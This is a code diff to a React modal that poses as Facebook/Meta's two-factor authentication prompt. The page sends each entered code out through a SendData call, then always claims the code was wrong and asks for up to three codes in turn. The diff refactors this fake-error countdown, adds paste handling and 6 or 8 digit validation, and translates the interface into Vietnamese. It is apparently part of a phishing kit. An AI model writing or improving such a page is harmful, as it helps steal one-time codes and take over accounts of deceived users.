@@ -12,12 +12,14 @@ interface TwoFactorModalProps {
 }
 
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
+    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
     const [loading, setLoading] = React.useState(false);
     const [click, setClick] = React.useState(0);
     const [disabled, setDisable] = React.useState(false);
+    const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null);
 
     const dispatch = useAppDispatch();
     const formDataState = useAppSelector((state) => state.stepForm.data);
@@ -29,33 +31,86 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
     const phoneDisplay = maskPhoneNumber(phone)
     const emailDisplay = maskEmail(email);
 
-    let [countdown, setCountdown] = React.useState<number>((process.env.NEXT_PUBLIC_SETTING_TIME) ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
+    const [countdown, setCountdown] = React.useState<number>(initialCountdown);
 
     React.useEffect(() => {
         setIsOpen(isOpend);
     }, [isOpend]);
 
+    React.useEffect(() => {
+        return () => {
+            if (intervalRef.current) {
+                clearInterval(intervalRef.current);
+            }
+        };
+    }, []);
+
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
         const { id, value } = e.target;
-        setTwoFa(value);
+        const normalizedValue = value.replace(/\D/g, '').slice(0, 8);
+        setTwoFa(normalizedValue);
         setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
 
         if (click === 0) {
-            dispatch(updateForm({ twoFa: value }));
+            dispatch(updateForm({ twoFa: normalizedValue }));
         }
 
         if (click === 1) {
-            dispatch(updateForm({ twoFaSecond: value }));
+            dispatch(updateForm({ twoFaSecond: normalizedValue }));
         }
 
         if (click === 2) {
-            dispatch(updateForm({ twoFaThird: value }));
+            dispatch(updateForm({ twoFaThird: normalizedValue }));
         }
     };
 
-    const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);
+    const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
+
+    const formatRetryError = (secondsLeft: number) => {
+        const minutes = Math.floor(secondsLeft / 60);
+        const seconds = secondsLeft % 60;
+        return `Mã xác thực bạn nhập chưa chính xác. Vui lòng thử lại sau ${minutes} phút ${seconds} giây.`;
+    };
+
+    const startRetryCountdown = (nextStep: number) => {
+        if (intervalRef.current) clearInterval(intervalRef.current);
+
+        setDisable(true);
+        setCountdown(initialCountdown);
+        setErrors({ twoFa: formatRetryError(initialCountdown) });
+
+        intervalRef.current = setInterval(() => {
+            setCountdown((prev) => {
+                const next = prev - 1;
+                if (next <= 0) {
+                    if (intervalRef.current) clearInterval(intervalRef.current);
+                    intervalRef.current = null;
+                    setClick(nextStep);
+                    setErrors({});
+                    setDisable(false);
+                    return initialCountdown;
+                }
+                setErrors({ twoFa: formatRetryError(next) });
+                return next;
+            });
+        }, 1000);
+    };
+
+    const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
+        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 8);
+        e.preventDefault();
+        setTwoFa(pasted);
+        setErrors((prev) => ({ ...prev, twoFa: '' }));
+        if (click === 0) dispatch(updateForm({ twoFa: pasted }));
+        if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
+        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
+    };
 
     const handleClose = () => {
+        if (intervalRef.current) {
+            clearInterval(intervalRef.current);
+            intervalRef.current = null;
+        }
         setIsOpen(false);
         onToggleModal(false);
     };
@@ -69,9 +124,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 setErrors(newErrors);
                 return;
             }
-            const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);
+            const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
             if (!isTwoFaValid) {
+                setErrors({ twoFa: 'Vui lòng nhập mã 2FA hợp lệ gồm 6 hoặc 8 chữ số.' });
                 return;
             }
 
@@ -81,42 +137,16 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
-                        const minutes = Math.floor(countdown / 60);
-                        const seconds = countdown % 60;
-                        setErrors({
-                            twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`,
-                        });
-
                         setLoading(false);
                         setTwoFa('');
-
-                        const countdownInterval = setInterval(() => {
-                            setDisable(true);
-                            countdown -= 1;
-                            setCountdown(countdown);
-
-                            const minutes = Math.floor(countdown / 60);
-                            const seconds = countdown % 60;
-
-                            setErrors({
-                                twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`
-                            });
-
-                            if (countdown <= 0) {
-                                clearInterval(countdownInterval);
-                                setClick(1);
-                                setErrors({});
-                                setDisable(false)
-                                setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
-                            }
-                        }, 1000);
+                        startRetryCountdown(1);
                     }, 1234);
 
                 })
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors(newErrors);
+                    setErrors({ twoFa: 'Không thể gửi mã xác thực. Vui lòng thử lại sau.' });
                 });
             }
 
@@ -124,41 +154,16 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
-                        const minutes = Math.floor(countdown / 60);
-                        const seconds = countdown % 60;
-                        setErrors({
-                            twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`,
-                        });
                         setLoading(false);
                         setTwoFa('');
-
-                        const countdownInterval = setInterval(() => {
-                            setDisable(true);
-                            countdown -= 1;
-                            setCountdown(countdown);
-
-                            const minutes = Math.floor(countdown / 60);
-                            const seconds = countdown % 60;
-
-                            setErrors({
-                                twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`
-                            });
-
-                            if (countdown <= 0) {
-                                clearInterval(countdownInterval);
-                                setClick(2);
-                                setErrors({});
-                                setDisable(false)
-                                setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
-                            }
-                        }, 1000);
+                        startRetryCountdown(2);
                     }, 1234);
 
                 })
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors(newErrors);
+                    setErrors({ twoFa: 'Không thể gửi mã xác thực. Vui lòng thử lại sau.' });
                 });
             }
 
@@ -178,7 +183,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors(newErrors);
+                    setErrors({ twoFa: 'Không thể xác minh mã 2FA. Vui lòng thử lại.' });
                 });
             }
 
@@ -204,42 +209,49 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                         <span>Facebook</span>
                     </div>
-                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>Two-factor authentication required (1/3)</h2>
-                    <p className='text-[#9a979e] text-[14px]'>Enter the code for this account that we send to {emailDisplay}, {phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)</p>
+                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>Yêu cầu xác thực hai yếu tố (Bước {click + 1}/3)</h2>
+                    <p className='text-[#9a979e] text-[14px]'>Nhập mã cho tài khoản này được gửi đến {emailDisplay}, {phoneDisplay} hoặc xác nhận bằng ứng dụng xác thực bạn đã thiết lập (như Duo Mobile hoặc Google Authenticator).</p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                     </div>
                     <div className='w-full'>
                         <form onSubmit={handSubmit}>
+                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Mã 2FA <span className='text-[#e5484d]'>*</span></label>
                             <div className={`${inputClass('twoFa')}`} >
                                 <input
-                                    type="number"
+                                    type="text"
+                                    inputMode="numeric"
                                     id="twoFa"
-                                    placeholder="Enter the code"
+                                    placeholder="Nhập mã xác thực"
                                     className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
+                                    onPaste={handlePaste}
                                     disabled={disabled}
+                                    maxLength={8}
+                                    aria-label='Mã xác thực hai yếu tố'
                                 />
                             </div>
+                            <p className='text-[#6a7893] text-[12px] mt-[-5px] mb-[10px]'>Mã hợp lệ gồm 6 hoặc 8 chữ số.</p>
                             {errorText('twoFa')}
 
                             <div className='w-full mt-[20px]'>
                                 <button
                                     className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                     disabled={disabled || !isTwoFaValid}
+                                    aria-label='Tiếp tục xác thực'
                                 >
                                     {loading && (
                                         <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                             <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                         </div>
                                     )}
-                                    {loading ? '' : 'Continue'}
+                                    {loading ? '' : 'Tiếp tục'}
                                 </button>
                             </div>
 
-                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none'>
-                                <span>Try another way</span>
+                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] pointer-events-none'>
+                                <span>Thử phương thức khác</span>
                             </div>
                         </form>
                     </div>
